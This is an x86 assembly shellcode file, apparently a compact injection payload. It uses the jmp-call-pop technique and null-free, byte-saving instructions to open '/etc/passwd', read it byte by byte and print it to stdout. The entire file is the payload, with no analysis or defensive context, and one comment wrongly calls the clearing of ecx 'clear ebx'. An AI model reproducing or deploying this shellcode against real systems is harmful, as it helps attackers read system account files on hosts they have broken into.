
global _start

section .text

_start:

	xor ecx, ecx	; clear ebx
	mul ecx		    ; clear edx, eax

	push ecx	    ; push 0x0 to pop into esi
	pop esi		    ; make zero for later

	inc edx		    ; 0x1 into edx

	jmp two		    ; jmp call pop

one:
	pop ebx		    ; jmp call pop

	push 0x5	    ; open() syscall number
	pop eax		    ; saves a byte over mov

	int 0x80	    ; run open() syscall

	xchg eax, esi	; place fd into esi

read:

	push esi		        ; push fd onto stack
	pop ebx			        ; pop fd into ebx

	push 0x3		        ; read() syscall number
	pop eax			        ; saves a byte

	lea ecx, [esp+1]	  ; read what's stored in esp

	int 0x80		        ; run read() syscall

	test eax, eax		    ; end of file = 0

	jne  display		

exit:
	inc eax
	int 0x80

display:
	push 0x4	; write() syscall number
	pop eax		; write() syscall into eax

	push 0x1	; push 0x1/fd onto stack
	pop ebx		; place fd into ebx

	int 0x80	; run write() syscall

	jmp read

two:
	call one
	db "/etc/passwd"
